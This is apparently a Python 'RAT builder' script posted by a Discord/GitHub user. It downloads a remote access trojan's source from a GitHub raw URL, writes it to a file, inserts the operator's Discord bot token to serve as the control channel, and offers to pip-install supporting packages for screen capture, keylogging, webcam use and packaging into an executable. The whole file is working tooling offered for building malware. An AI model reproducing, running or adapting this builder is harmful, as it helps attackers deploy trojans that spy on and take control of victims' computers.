# Made by https://github.com/Paloox
# You have a question? add me on discord: p4u1_

import requests
import os
import pystyle
import colorama
from colorama import Fore
import win32gui
hwnd = win32gui.GetForegroundWindow()
win32gui.MoveWindow(hwnd, 100, 0, 1220, 850, True)

os.system("title Rat Builder - by p4u1_")

os.system("cls")

def source_get_write(filename):
    url = 'https://raw.githubusercontent.com/Paloox/discordRatFile/main/rat.py'
    response = requests.get(url)
    
    if response.status_code == 200:
        file_content = response.text
        with open(f'{filename}.py', 'w', encoding='utf-8') as file:
            file.write(file_content)
        


def set_bot_token(file_path, bot_token):
    search_text = "BOT_TOKEN"
    replace_text = bot_token

    with open(f'{file_path}.py', 'r') as file:
        data = file.read()
        data = data.replace(search_text, replace_text)

    with open(f'{file_path}.py', 'w') as file:
        file.write(data)
    print(f"{Fore.LIGHTGREEN_EX}File '{file_path}.py' created successfully!{Fore.RESET}")
def download_packets():
    os.system("pip install pyautogui discord requests opencv-python pynput pyttsx3 pywin32 pycryptodome pillow requests-toolbelt httpx pywin32 pyinstaller pydub")


def main():

    print(fr"{Fore.LIGHTMAGENTA_EX} _____                                                                                                              _____ {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX}( ___ )------------------------------------------------------------------------------------------------------------( ___ ){Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | R |                                                                                                              | R | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | A |  ██▓███      ██▀███      ██▓          ▄▄▄▄       █    ██     ██▓    ██▓       ▓█████▄    ▓█████     ██▀███   | A | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | T | ▓██░  ██▒   ▓██ ▒ ██▒   ▓██▒         ▓█████▄     ██  ▓██▒   ▓██▒   ▓██▒       ▒██▀ ██▌   ▓█   ▀    ▓██ ▒ ██▒ | T | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} |   | ▓██░ ██▓▒   ▓██ ░▄█ ▒   ▒██▒         ▒██▒ ▄██   ▓██  ▒██░   ▒██▒   ▒██░       ░██   █▌   ▒███      ▓██ ░▄█ ▒ |   | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | B | ▒██▄█▓▒ ▒   ▒██▀▀█▄     ░██░         ▒██░█▀     ▓▓█  ░██░   ░██░   ▒██░       ░▓█▄   ▌   ▒▓█  ▄    ▒██▀▀█▄   | B | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | U | ▒██▒ ░  ░   ░██▓ ▒██▒   ░██░         ░▓█  ▀█▓   ▒▒█████▓    ░██░   ░██████▒   ░▒████▓    ░▒████▒   ░██▓ ▒██▒ | U | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | I | ▒▓▒░ ░  ░   ░ ▒▓ ░▒▓░   ░▓           ░▒▓███▀▒   ░▒▓▒ ▒ ▒    ░▓     ░ ▒░▓  ░    ▒▒▓  ▒    ░░ ▒░ ░   ░ ▒▓ ░▒▓░ | I | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | L | ░▒ ░          ░▒ ░ ▒░    ▒ ░         ▒░▒   ░    ░░▒░ ░ ░     ▒ ░   ░ ░ ▒  ░    ░ ▒  ▒     ░ ░  ░     ░▒ ░ ▒░ | L | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} | D | ░░            ░░   ░     ▒ ░          ░    ░     ░░░ ░ ░     ▒ ░     ░ ░       ░ ░  ░       ░        ░░   ░  | D | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} |   |                ░         ░            ░            ░         ░         ░  ░      ░          ░  ░      ░      |   | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} |   |                                            ░                                   ░                             |   | {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX} |___|                                        made by https://github.com/Paloox                                     |___| {Fore.RESET}")
    print(fr"{Fore.LIGHTMAGENTA_EX}(_____)------------------------------------------------------------------------------------------------------------(_____){Fore.RESET}")      
    print("") 
    bot_token = input(f"{Fore.CYAN}[{Fore.MAGENTA}+{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Token: " + Fore.RESET)
    filename = input(f"{Fore.CYAN}[{Fore.MAGENTA}+{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Filename: " + Fore.RESET)
    download = input(f"{Fore.CYAN}[{Fore.MAGENTA}+{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Download packets for the rat? (y/n) " + Fore.RESET)
    source_get_write(filename)
    set_bot_token(filename, bot_token)

    if(download == "y"):
        download_packets()

main()